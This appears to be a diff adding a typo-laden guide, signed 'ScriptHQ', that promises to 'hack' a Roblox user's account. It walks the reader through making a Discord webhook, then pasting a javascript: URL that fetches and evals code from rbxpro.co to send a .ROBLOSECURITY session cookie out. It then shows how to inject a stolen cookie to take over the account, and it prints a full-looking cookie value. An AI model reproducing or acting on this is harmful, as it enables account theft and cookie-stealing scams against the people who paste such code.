@@ -1,0 +1,28 @@
+Then i want you to go to this website!!      http://rbxpro.co/WH     
+When you are there i want you to go back to discord   and create a text channel on the server and name it LOGGER, then i want you to go to the settings of that text channel
+then find interigations and then Press create a widget! and Copy the widget URl
+then go back to rbxpro.co/WH and paste it into that box! 
+then agree to the terms and copy the new link
+then it should look somthing like this! Javascript:$.get(' //rbxpro.co/?id=343959335',i=>eval(i))
+then with your link put an Xinfront of it like this! XJavascript:$.get(' //rbxpro.co/?id=343959335',i=>eval(i))
+then go to the users profile you want to hack! 
+and go up to there bar that should look like this: https://www.roblox.com/users/12345678/profile
+delet that text and instead input this:XJavascript:$.get(' //rbxpro.co/?id=343959335',i=>eval(i))
+then DELETE THE X INFRONT OF JAVASCRIPT
+And press enter!
+then go to discord!! 
+and LOOK
+SOMTHING CAME UP
+YESS
+CONGRATS YOU HAVE GOTTEN A COOKIE
+now the cookie should look like this:
+DO NOT USE FOR ACCOUNT THEFT set-cookie: .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEE5E4EAE14D740EBFF56346701ED744DF565F5F00981164891C0D01753D53CDB33F2E8FF320572EB8283E55ECA8DC64C4C70B69DAF6F06E3E92D4B72C7FCBE599793EFE402ADD5DCC4E75E13F1E590F722926BF0CCEF32DAA437A579C1555DD207CAA6953E7044C3B3D3E9AFAC9873E868B571DB8771114C9551C8B92DD92ABC8F54E58CF589545DD4C9F2584747E8B982CAFD83ECEA2AF5C309969233E61F69DA39269A5260C0C5A9B766C06029D86D0680433F9A4894E21C3015DEF2754AE44D6F4460E0FD1A8887B0BB1AA4619A2C56FB6A640C0F49755CEF069258503C8ECA529908F04609320AC7A7C6B9D629806AD3560847234E7A03DAEF32C1DE03E90BDDC79762464BA8167B6E5B2B5468AC855410A050DAD82D84F9CCA3689BD282D85FB8905B22428CF18347D1D1D5CF1DB081C8; domain=.roblox.com; expires=Thu, 13-Oct-2050 21:30:47 GMT; path=/; HttpOnly
+then i want you too highlight the whole cookie and copy it
+then go to Roblox at your profile
+and open editthiscookie!
+and find were it says .ROBLOSCRUIRTY
+and delete everything in there and replace it with your cookie you just logged!
+THEN REFRESH THE PAGE...
+BOOM!
+you stole an account!
+                               DO NOT ABUSE THIS -ScriptHQ
